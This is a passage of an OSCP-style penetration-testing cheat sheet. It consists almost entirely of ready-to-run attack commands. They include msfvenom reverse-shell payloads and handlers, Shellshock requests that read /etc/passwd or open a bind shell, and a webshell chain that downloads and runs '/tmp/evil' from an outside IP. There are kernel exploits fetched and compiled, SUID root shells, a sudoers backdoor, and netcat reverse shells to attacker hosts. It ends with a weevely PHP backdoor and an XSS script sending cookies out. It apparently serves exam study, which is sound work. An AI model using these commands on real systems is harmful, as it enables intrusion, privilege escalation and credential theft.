pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></p><p>  <em>ASP</em></p><p>  <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</code></p><p>  <em>JSP</em></p><p>  <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</code></p><p>  <em>WAR</em></p><p>  <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</code></p><p>  <strong>Scripting Payloads</strong></p><p>  <em>Python</em></p><p>  <code>msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</code></p><p>  <em>Bash</em></p><p>  <code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</code></p><p>  <em>Perl</em></p><p>  <code>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</code></p><p>  <strong>Shellcode</strong></p><p>  For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.</p><p>  <em>Linux Based Shellcode</em></p><p>  <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p><p>  <em>Windows Based Shellcode</em></p><p>  <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p><p>  <em>Mac Based Shellcode</em></p><p>  <code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p><p>  <strong>Handlers</strong><br>  Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.</p><pre><code> use exploit/multi/handler set PAYLOAD &lt;Payload name&gt; set LHOST &lt;LHOST value&gt; set LPORT &lt;LPORT value&gt; set ExitOnSession false exploit -j -z</code></pre><p>  Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘</p></li><li><p>SSH to Meterpreter: <a href="https://daemonchild.com/2015/08/10/got-ssh-creds-want-meterpreter-try-this/">https://daemonchild.com/2015/08/10/got-ssh-creds-want-meterpreter-try-this/</a></p><pre><code> use auxiliary/scanner/ssh/ssh_login use post/multi/manage/shell_to_meterpreter</code></pre></li><li><p>Shellshock</p><ul><li>Testing for shell shock with NMap</li></ul><p><code>root@kali:~/Documents# nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi $ip</code></p><ul><li>git clone <a href="https://github.com/nccgroup/shocker">https://github.com/nccgroup/shocker</a></li></ul><p><code>./shocker.py -H TARGET --command &quot;/bin/cat /etc/passwd&quot; -c /cgi-bin/status --verbose</code></p><ul><li><p>Shell Shock SSH Forced Command<br>Check for forced command by enabling all debug output with ssh</p><pre><code>  ssh -vvv  ssh -i noob noob@$ip &#39;() &#123; :;&#125;; /bin/bash&#39;</code></pre></li><li><p>cat file (view file contents)</p><pre><code>  echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () &#123;:;&#125;; echo \\$(&lt;/etc/passwd)\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n&quot; | nc TARGET 80</code></pre></li><li><p>Shell Shock run bind shell</p><pre><code> echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () &#123;:;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n&quot; | nc TARGET 80</code></pre></li></ul></li></ul><h1 id="File-Transfers"><a href="#File-Transfers" class="headerlink" title="File Transfers"></a>File Transfers</h1><ul><li><p>Post exploitation refers to the actions performed by an attacker,<br>once some level of control has been gained on his target.</p></li><li><p>Simple Local Web Servers</p><ul><li><p>Run a basic http server, great for serving up shells etc<br>python -m SimpleHTTPServer 80</p></li><li><p>Run a basic Python3 http server, great for serving up shells<br>etc<br>python3 -m http.server</p></li><li><p>Run a ruby webrick basic http server<br>ruby -rwebrick -e “WEBrick::HTTPServer.new<br>(:Port &#x3D;&gt; 80, :DocumentRoot &#x3D;&gt; Dir.pwd).start”</p></li><li><p>Run a basic PHP http server<br>php -S $ip:80</p></li></ul></li><li><p>Creating a wget VB Script on Windows:<br><a href="https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt"><em>https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt</em></a></p></li><li><p>Windows file transfer script that can be pasted to the command line.  File transfers to a Windows machine can be tricky without a Meterpreter shell.  The following script can be copied and pasted into a basic windows reverse and used to transfer files from a web server (the timeout 1 commands are required after each new line):</p><pre><code> echo Set args = Wscript.Arguments  &gt;&gt; webdl.vbs timeout 1 echo Url = &quot;http://1.1.1.1/windows-privesc-check2.exe&quot;  &gt;&gt; webdl.vbs timeout 1 echo dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)  &gt;&gt; webdl.vbs timeout 1 echo dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)  &gt;&gt; webdl.vbs timeout 1 echo xHttp.Open &quot;GET&quot;, Url, False  &gt;&gt; webdl.vbs timeout 1 echo xHttp.Send  &gt;&gt; webdl.vbs timeout 1 echo with bStrm      &gt;&gt; webdl.vbs timeout 1 echo .type = 1 &#39;      &gt;&gt; webdl.vbs timeout 1 echo .open      &gt;&gt; webdl.vbs timeout 1 echo .write xHttp.responseBody      &gt;&gt; webdl.vbs timeout 1 echo .savetofile &quot;C:\temp\windows-privesc-check2.exe&quot;, 2 &#39;  &gt;&gt; webdl.vbs timeout 1 echo end with &gt;&gt; webdl.vbs timeout 1 echo</code></pre><p>  The file can be run using the following syntax:</p><p>  <code>C:\temp\cscript.exe webdl.vbs</code></p></li><li><p>Mounting File Shares</p><ul><li>Mount NFS share to &#x2F;mnt&#x2F;nfs<br>mount $ip:&#x2F;vol&#x2F;share &#x2F;mnt&#x2F;nfs</li></ul></li><li><p>HTTP Put<br>nmap -p80 $ip –script http-put –script-args<br>http-put.url&#x3D;’&#x2F;test&#x2F;sicpwn.php’,http-put.file&#x3D;’&#x2F;var&#x2F;www&#x2F;html&#x2F;sicpwn.php</p></li><li><h2 id="Uploading-Files"><a href="#Uploading-Files" class="headerlink" title="Uploading Files"></a>Uploading Files</h2><ul><li><p>SCP</p><p>scp username1@source_host:directory1&#x2F;filename1 username2@destination_host:directory2&#x2F;filename2</p><p>scp localfile username@$ip:~&#x2F;Folder&#x2F;</p><p>scp Linux_Exploit_Suggester.pl <a href="mailto:&#x62;&#x6f;&#98;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#x31;&#46;&#49;&#48;">&#x62;&#x6f;&#98;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#x31;&#46;&#49;&#48;</a>:~</p></li><li><p>Webdav with Davtest- Some sysadmins are kind enough to enable the PUT method - This tool will auto upload a backdoor</p><p><code>davtest -move -sendbd auto -url http://$ip</code></p><p><a href="https://github.com/cldrn/davtest">https://github.com/cldrn/davtest</a></p><p>You can also upload a file using the PUT method with the curl command:</p><p><code>curl -T &#39;leetshellz.txt&#39; &#39;http://$ip&#39;</code></p><p>And rename it to an executable file using the MOVE method with the curl command:</p><p><code>curl -X MOVE --header &#39;Destination:http://$ip/leetshellz.php&#39; &#39;http://$ip/leetshellz.txt&#39;</code></p></li><li><p>Upload shell using limited php shell cmd<br>use the webshell to download and execute the meterpreter<br>[curl -s –data “cmd&#x3D;wget <a href="http://174.0.42.42:8000/dhn">http://174.0.42.42:8000/dhn</a> -O<br>&#x2F;tmp&#x2F;evil” http:&#x2F;&#x2F;$ip&#x2F;files&#x2F;sh.php<br>[curl -s –data “cmd&#x3D;chmod 777 &#x2F;tmp&#x2F;evil”<br>http:&#x2F;&#x2F;$ip&#x2F;files&#x2F;sh.php<br>curl -s –data “cmd&#x3D;bash -c &#x2F;tmp&#x2F;evil” http:&#x2F;&#x2F;$ip&#x2F;files&#x2F;sh.php</p></li><li><p>TFTP<br>mkdir &#x2F;tftp<br>atftpd –daemon –port 69 &#x2F;tftp<br>cp &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;nc.exe &#x2F;tftp&#x2F;<br>EX. FROM WINDOWS HOST:<br>C:\Users\Offsec&gt;tftp -i $ip get nc.exe</p></li><li><p>FTP<br>apt-get update &amp;&amp; apt-get install pure-ftpd</p><p>#!&#x2F;bin&#x2F;bash<br>groupadd ftpgroup<br>useradd -g ftpgroup -d &#x2F;dev&#x2F;null -s &#x2F;etc ftpuser<br>pure-pw useradd offsec -u ftpuser -d &#x2F;ftphome<br>pure-pw mkdb<br>cd &#x2F;etc&#x2F;pure-ftpd&#x2F;auth&#x2F;<br>ln -s ..&#x2F;conf&#x2F;PureDB 60pdb<br>mkdir -p &#x2F;ftphome<br>chown -R ftpuser:ftpgroup &#x2F;ftphome&#x2F;</p><p>&#x2F;etc&#x2F;init.d&#x2F;pure-ftpd restart</p></li></ul></li><li><h2 id="Packing-Files"><a href="#Packing-Files" class="headerlink" title="Packing Files"></a>Packing Files</h2><ul><li><p>Ultimate Packer for eXecutables<br>upx -9 nc.exe</p></li><li><p>exe2bat - Converts EXE to a text file that can be copied and<br>pasted<br>locate exe2bat<br>wine exe2bat.exe nc.exe nc.txt</p></li><li><p>Veil - Evasion Framework -<br><a href="https://github.com/Veil-Framework/Veil-Evasion">https://github.com/Veil-Framework/Veil-Evasion</a><br>apt-get -y install git<br>git clone <a href="https://github.com/Veil-Framework/Veil-Evasion.git">https://github.com/Veil-Framework/Veil-Evasion.git</a><br>cd Veil-Evasion&#x2F;<br>cd setup<br>setup.sh -c</p></li></ul></li></ul><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p><em>Password reuse is your friend.  The OSCP labs are true to life, in the way that the users will reuse passwords across different services and even different boxes. Maintain a list of cracked passwords and test them on new machines you encounter.</em></p><ul><li><h2 id="Linux-Privilege-Escalation"><a href="#Linux-Privilege-Escalation" class="headerlink" title="Linux Privilege Escalation"></a>Linux Privilege Escalation</h2></li><li><p>Defacto Linux Privilege Escalation Guide  - A much more through guide for linux enumeration:<br><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p></li><li><p>Try the obvious - Maybe the user can sudo to root:</p><p><code>sudo su</code></p></li><li><p>Here are the commands I have learned to use to perform linux enumeration and privledge escalation:</p><p>What services are running as root?:</p><p><code>ps aux | grep root</code></p><p>What files run as root &#x2F; SUID &#x2F; GUID?:</p><pre><code> find / -perm +2000 -user root -type f -print find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here. find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it. find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it. find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld &#123;&#125; \; 2&gt;/dev/null</code></pre><p>What folders are world writeable?:</p><pre><code> find / -writable -type d 2&gt;/dev/null      # world-writeable folders find / -perm -222 -type d 2&gt;/dev/null     # world-writeable folders find / -perm -o w -type d 2&gt;/dev/null     # world-writeable folders find / -perm -o x -type d 2&gt;/dev/null     # world-executable folders find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders</code></pre></li><li><p>There are a few scripts that can automate the linux enumeration process:</p><ul><li><p>Google is my favorite Linux Kernel exploitation search tool.  Many of these automated checkers are missing important kernel exploits which can create a very frustrating blindspot during your OSCP course.</p></li><li><p>LinuxPrivChecker.py - My favorite automated linux priv enumeration checker -</p><p> <a href="https://www.securitysift.com/download/linuxprivchecker.py">https://www.securitysift.com/download/linuxprivchecker.py</a></p></li><li><p>LinEnum - (Recently Updated)</p></li></ul><p>  <a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><ul><li>linux-exploit-suggester (Recently Updated)</li></ul><p>  <a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><ul><li><p>Highon.coffee Linux Local Enum - Great enumeration script!</p><p><code>wget https://highon.coffee/downloads/linux-local-enum.sh</code></p></li><li><p>Linux Privilege Exploit Suggester  (Old has not been updated in years)</p></li></ul><p><a href="https://github.com/PenturaLabs/Linux_Exploit_Suggester">https://github.com/PenturaLabs/Linux_Exploit_Suggester</a></p><ul><li>Linux post exploitation enumeration and exploit checking tools</li></ul><p><a href="https://github.com/reider-roque/linpostexp">https://github.com/reider-roque/linpostexp</a></p></li></ul><p>Handy Kernel Exploits</p><ul><li><p>CVE-2010-2959 - ‘CAN BCM’ Privilege Escalation - Linux Kernel &lt; 2.6.36-rc1 (Ubuntu 10.04 &#x2F; 2.6.32)</p><p><a href="https://www.exploit-db.com/exploits/14814/">https://www.exploit-db.com/exploits/14814/</a></p><pre><code> wget -O i-can-haz-modharden.c http://www.exploit-db.com/download/14814 $ gcc i-can-haz-modharden.c -o i-can-haz-modharden $ ./i-can-haz-modharden [+] launching root shell! # id uid=0(root) gid=0(root)</code></pre></li><li><p>CVE-2010-3904 - Linux RDS Exploit - Linux Kernel &lt;&#x3D; 2.6.36-rc8<br><a href="https://www.exploit-db.com/exploits/15285/">https://www.exploit-db.com/exploits/15285/</a></p></li><li><p>CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo &#x2F; Ubuntu x86&#x2F;x64)<br><a href="https://git.zx2c4.com/CVE-2012-0056/about/">https://git.zx2c4.com/CVE-2012-0056/about/</a><br>Linux CVE 2012-0056</p><pre><code>  wget -O exploit.c http://www.exploit-db.com/download/18411  gcc -o mempodipper exploit.c  ./mempodipper</code></pre></li><li><p>CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel &lt;&#x3D; 3.19.0-73.8<br><a href="https://dirtycow.ninja/">https://dirtycow.ninja/</a><br>First existed on 2.6.22 (released in 2007) and was fixed on Oct 18, 2016</p></li><li><p>Run a command as a user other than root</p><pre><code>  sudo -u haxzor /usr/bin/vim /etc/apache2/sites-available/000-default.conf</code></pre></li><li><p>Add a user or change a password</p><pre><code>  /usr/sbin/useradd -p &#39;openssl passwd -1 thePassword&#39; haxzor  echo thePassword | passwd haxzor --stdin</code></pre></li><li><p>Local Privilege Escalation Exploit in Linux</p><ul><li><p><strong>SUID</strong> (<strong>S</strong>et owner <strong>U</strong>ser <strong>ID</strong> up on execution)<br>Often SUID C binary files are required to spawn a shell as a<br>superuser, you can update the UID &#x2F; GID and shell as required.</p><p>below are some quick copy and paste examples for various<br>shells:</p><pre><code>  SUID C Shell for /bin/bash  int main(void)&#123;  setresuid(0, 0, 0);  system(&quot;/bin/bash&quot;);  &#125;  SUID C Shell for /bin/sh  int main(void)&#123;  setresuid(0, 0, 0);  system(&quot;/bin/sh&quot;);  &#125;  Building the SUID Shell binary  gcc -o suid suid.c  For 32 bit:  gcc -m32 -o suid suid.c</code></pre></li><li><p>Create and compile an SUID from a limited shell (no file transfer)</p><pre><code>  echo &quot;int main(void)&#123;\nsetgid(0);\nsetuid(0);\nsystem(\&quot;/bin/sh\&quot;);\n&#125;&quot; &gt;privsc.c  gcc privsc.c -o privsc</code></pre></li></ul></li><li><p>Handy command if you can get a root user to run it. Add the www-data user to Root SUDO group with no password requirement:</p><p><code>echo &#39;chmod 777 /etc/sudoers &amp;&amp; echo &quot;www-data ALL=NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers&#39; &gt; /tmp/update</code></p></li><li><p>You may find a command is being executed by the root user, you may be able to modify the system PATH environment variable<br>to execute your command instead.  In the example below, ssh is replaced with a reverse shell SUID connecting to 10.10.10.1 on<br>port 4444.</p><pre><code> set PATH=&quot;/tmp:/usr/local/bin:/usr/bin:/bin&quot; echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.1 4444 &gt;/tmp/f&quot; &gt;&gt; /tmp/ssh chmod +x ssh</code></pre></li><li><p>SearchSploit</p><pre><code>      searchsploit –uncsearchsploit apache 2.2      searchsploit &quot;Linux Kernel&quot;      searchsploit linux 2.6 | grep -i ubuntu | grep local      searchsploit slmail</code></pre></li><li><p>Kernel Exploit Suggestions for Kernel Version 3.0.0</p><p><code>./usr/share/linux-exploit-suggester/Linux_Exploit_Suggester.pl -k 3.0.0</code></p></li><li><p>Precompiled Linux Kernel Exploits  - <em><strong>Super handy if GCC is not installed on the target machine!</strong></em></p><p><a href="https://www.kernel-exploits.com/"><em>https://www.kernel-exploits.com/</em></a></p></li><li><p>Collect root password</p><p><code>cat /etc/shadow |grep root</code></p></li><li><p>Find and display the proof.txt or flag.txt - LOOT!</p><pre><code>    cat `find / -name proof.txt -print`</code></pre></li><li><h2 id="Windows-Privilege-Escalation"><a href="#Windows-Privilege-Escalation" class="headerlink" title="Windows Privilege Escalation"></a>Windows Privilege Escalation</h2></li><li><p>Windows Privilege Escalation resource<br><a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a></p></li><li><p>Try the getsystem command using meterpreter - rarely works but is worth a try.</p><p><code>meterpreter &gt; getsystem</code></p></li><li><p>Metasploit Meterpreter Privilege Escalation Guide<br><a href="https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/">https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/</a></p></li><li><p>Windows Server 2003 and IIS 6.0 WEBDAV Exploiting<br><a href="http://www.r00tsec.com/2011/09/exploiting-microsoft-iis-version-60.html">http://www.r00tsec.com/2011/09/exploiting-microsoft-iis-version-60.html</a></p><pre><code> msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=443 -f asp &gt; aspshell.txt cadavar http://$ip dav:/&gt; put aspshell.txt Uploading aspshell.txt to `/aspshell.txt&#39;: Progress: [=============================&gt;] 100.0% of 38468 bytes succeeded. dav:/&gt; copy aspshell.txt aspshell3.asp;.txt Copying `/aspshell3.txt&#39; to `/aspshell3.asp%3b.txt&#39;:  succeeded. dav:/&gt; exit msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp msf exploit(handler) &gt; set LHOST 1.2.3.4 msf exploit(handler) &gt; set LPORT 80 msf exploit(handler) &gt; set ExitOnSession false msf exploit(handler) &gt; exploit -j curl http://$ip/aspshell3.asp;.txt [*] Started reverse TCP handler on 1.2.3.4:443 [*] Starting the payload handler... [*] Sending stage (957487 bytes) to 1.2.3.5 [*] Meterpreter session 1 opened (1.2.3.4:443 -&gt; 1.2.3.5:1063) at 2017-09-25 13:10:55 -0700</code></pre></li><li><p>Windows privledge escalation exploits are often written in Python. So, it is necessary to compile the using pyinstaller.py into an executable and upload them to the remote server.</p><pre><code> pip install pyinstaller wget -O exploit.py http://www.exploit-db.com/download/31853 python pyinstaller.py --onefile exploit.py</code></pre></li><li><p>Windows Server 2003 and IIS 6.0 privledge escalation using impersonation:</p><p>  <a href="https://www.exploit-db.com/exploits/6705/">https://www.exploit-db.com/exploits/6705/</a></p><p>  <a href="https://github.com/Re4son/Churrasco">https://github.com/Re4son/Churrasco</a></p><pre><code> c:\Inetpub&gt;churrasco churrasco /churrasco/--&gt;Usage: Churrasco.exe [-d] &quot;command to run&quot; c:\Inetpub&gt;churrasco -d &quot;net user /add &lt;username&gt; &lt;password&gt;&quot; c:\Inetpub&gt;churrasco -d &quot;net localgroup administrators &lt;username&gt; /add&quot; c:\Inetpub&gt;churrasco -d &quot;NET LOCALGROUP &quot;Remote Desktop Users&quot; &lt;username&gt; /ADD&quot;</code></pre></li><li><p>Windows MS11-080 - <a href="http://www.exploit-db.com/exploits/18176/">http://www.exploit-db.com/exploits/18176/</a></p><pre><code>  python pyinstaller.py --onefile ms11-080.py  mx11-080.exe -O XP</code></pre></li><li><p>Powershell Exploits - You may find that some Windows privledge escalation exploits are written in Powershell. You may not have an interactive shell that allows you to enter the powershell prompt.  Once the powershell script is uploaded to the server, here is a quick one liner to run a powershell command from a basic (cmd.exe) shell:</p><p>  MS16-032 <a href="https://www.exploit-db.com/exploits/39719/">https://www.exploit-db.com/exploits/39719/</a></p><p>  <code>powershell -ExecutionPolicy ByPass -command &quot;&amp; &#123; . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 &#125;&quot;</code></p></li><li><p>Powershell Priv Escalation Tools<br><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></p></li><li><p>Windows Run As - Switching users in linux is trival with the <code>SU</code> command.  However, an equivalent command does not exist in Windows.  Here are 3 ways to run a command as a different user in Windows.</p><ul><li><p>Sysinternals psexec is a handy tool for running a command on a remote or local server as a specific user, given you have thier username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system).</p><pre><code> C:\&gt;psexec64 \\COMPUTERNAME -u Test -p test -h &quot;c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe&quot; PsExec v2.2 - Execute processes remotely Copyright (C) 2001-2016 Mark Russinovich Sysinternals - www.sysinternals.com</code></pre></li><li><p>Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe:</p><pre><code> C:\&gt;C:\Windows\System32\runas.exe /env /noprofile /user:Test &quot;c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe&quot; Enter the password for Test: Attempting to start nc.exe as user &quot;COMPUTERNAME\Test&quot; ...</code></pre></li><li><p>PowerShell can also be used to launch a process as another user. The following simple powershell script will run a reverse shell as the specified username and password.</p><pre><code> $username = &#39;&lt;username here&gt;&#39; $password = &#39;&lt;password here&gt;&#39; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList (&quot;-nc&quot;,&quot;192.168.1.10&quot;,&quot;4444&quot;,&quot;-e&quot;,&quot;cmd.exe&quot;) -WorkingDirectory C:\Users\Public</code></pre><p>   Next run this script using powershell.exe:</p><p>   <code>powershell -ExecutionPolicy ByPass -command &quot;&amp; &#123; . C:\Users\public\PowerShellRunAs.ps1; &#125;&quot;</code></p></li></ul></li><li><p>Windows Service Configuration Viewer - Check for misconfigurations<br>in services that can lead to privilege escalation. You can replace<br>the executable with your own and have windows execute whatever code<br>you want as the privileged user.<br>icacls scsiaccess.exe</p><pre><code> scsiaccess.exe NT AUTHORITY\SYSTEM:(I)(F) BUILTIN\Administrators:(I)(F) BUILTIN\Users:(I)(RX) APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX) Everyone:(I)(F)</code></pre></li><li><p>Compile a custom add user command in windows using C</p><pre><code>     root@kali:~\# cat useradd.c     #include &lt;stdlib.h&gt; /* system, NULL, EXIT_FAILURE */     int main ()     &#123;     int i;     i=system (&quot;net localgroup administrators low /add&quot;);     return 0;     &#125;     i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c</code></pre></li><li><p>Group Policy Preferences (GPP)<br>A common useful misconfiguration found in modern domain environments<br>is unprotected Windows GPP settings files</p><ul><li><p>map the Domain controller SYSVOL share</p><p><code>net use z:\\dc01\SYSVOL</code></p></li><li><p>Find the GPP file: Groups.xml</p><p><code>dir /s Groups.xml</code></p></li><li><p>Review the contents for passwords</p><p><code>type Groups.xml</code></p></li><li><p>Decrypt using GPP Decrypt</p><p><code>gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB</code></p></li></ul></li><li><p>Find and display the proof.txt or flag.txt - get the loot!</p><p><code>#meterpreter  &gt;     run  post/windows/gather/win_privs</code><br><code>cd\ &amp; dir /b /s proof.txt</code><br><code>type c:\pathto\proof.txt</code></p></li></ul><h1 id="Client-Web-and-Password-Attacks"><a href="#Client-Web-and-Password-Attacks" class="headerlink" title="Client, Web and Password Attacks"></a>Client, Web and Password Attacks</h1><ul><li><h2 id="Client-Attacks"><a href="#Client-Attacks" class="headerlink" title="Client Attacks"></a><span id="_pcjm0n4oppqx" class="anchor"><span id="_Toc480741817" class="anchor"></span></span>Client Attacks</h2><ul><li><p>MS12-037- Internet Explorer 8 Fixed Col Span ID<br>wget -O exploit.html<br><a href="http://www.exploit-db.com/download/24017">http://www.exploit-db.com/download/24017</a><br>service apache2 start</p></li><li><p>JAVA Signed Jar client side attack<br>echo ‘<applet width="1" height="1" id="Java Secure"code="Java.class" archive="SignedJava.jar"><param name="1"value="http://$ip:80/evil.exe"></applet>‘ &gt;<br>&#x2F;var&#x2F;www&#x2F;html&#x2F;java.html<br>User must hit run on the popup that occurs.</p></li><li><p>Linux Client Shells<br><a href="http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/"><em>http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/</em></a></p></li><li><p>Setting up the Client Side Exploit</p></li><li><p>Swapping Out the Shellcode</p></li><li><p>Injecting a Backdoor Shell into Plink.exe<br>backdoor-factory -f &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;plink.exe -H $ip<br>-P 4444 -s reverse_shell_tcp</p></li></ul></li><li><h2 id="Web-Attacks"><a href="#Web-Attacks" class="headerlink" title="Web Attacks"></a><span id="_n6fr3j21cp1m" class="anchor"><span id="_Toc480741818" class="anchor"></span></span>Web Attacks</h2><ul><li><p>Web Shag Web Application Vulnerability Assessment Platform<br>webshag-gui</p></li><li><p>Web Shells<br><a href="http://tools.kali.org/maintaining-access/webshells"><em>http://tools.kali.org/maintaining-access/webshells</em></a><br>ls -l &#x2F;usr&#x2F;share&#x2F;webshells&#x2F;</p></li><li><p>Generate a PHP backdoor (generate) protected with the given<br>password (s3cr3t)<br>weevely generate s3cr3t<br>weevely http:&#x2F;&#x2F;$ip&#x2F;weevely.php s3cr3t</p></li><li><p>Java Signed Applet Attack</p></li><li><p>HTTP &#x2F; HTTPS Webserver Enumeration</p><ul><li><p>OWASP Dirbuster</p></li><li><p>nikto -h $ip</p></li></ul></li><li><p>Essential Iceweasel Add-ons<br>Cookies Manager<br><a href="https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/">https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/</a><br>Tamper Data<br><a href="https://addons.mozilla.org/en-US/firefox/addon/tamper-data/">https://addons.mozilla.org/en-US/firefox/addon/tamper-data/</a></p></li><li><p>Cross Site Scripting (XSS)<br>significant impacts, such as cookie stealing and authentication<br>bypass, redirecting the victim’s browser to a malicious HTML<br>page, and more</p></li><li><p>Browser Redirection and IFRAME Injection</p><iframe SRC="http://$ip/report" height = "0" width="0"></iframe></li><li><p>Stealing Cookies and Session Information</p><script>newimage().src="http://$ip/bogus.php?output="+document.cookie;</script><p>nc -nlvp 80</p></li></ul></li><li><h2 id="File-Inclusion-Vulnerabilities"><a href="#File-Inclusion-Vulnerabilities" class="headerlink" title="File Inclusion Vulnerabilities"></a>File Inclusion Vulnerabilities</h2><ul><li><p>Local (LFI) and remote (RFI) file inclusion vulnerabilities are<br>commonly found in poorly written PHP code.</p></li><li><p>fimap - There is a Python tool called fimap which can be<br>leveraged to automate the exploitation of LFI&#x2F;RFI<br>vulnerabilities that are found in PHP (sqlmap for LFI):<br><a href="https://github.com/kurobeats/fimap"><em>https://github.com/kurobeats/fimap</em></a></p><ul><li>Gaining a shell from phpinfo()<br>fimap + phpinfo() Exploit - If a phpinfo() file is present,<br>it’s usually possible to get a shell, if you don’t know the<br>location of the phpinfo file fimap can probe for it, or you<br>could use a tool like OWASP DirBuster.</li></ul></li><li><p>For Local File Inclusions look for the include() function in PHP<br>code.<br>include(“lang&#x2F;“.$_COOKIE[‘lang’]);<br>include($_GET[‘page’].”.php”);</p></li><li><p>LFI - Encode and Decode a file using base64<br>curl -s<br>http:&#x2F;&#x2F;$ip&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index<br>| grep -e ‘[^\ ]\{40,\}’ | base64 -d</p></li><li><p>LFI - Download file with base 64 encoding<br><a href="about:blank"><em>http:&#x2F;&#x2F;$ip&#x2F;index.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;admin.php</em></a></p></li><li><p>LFI Linux 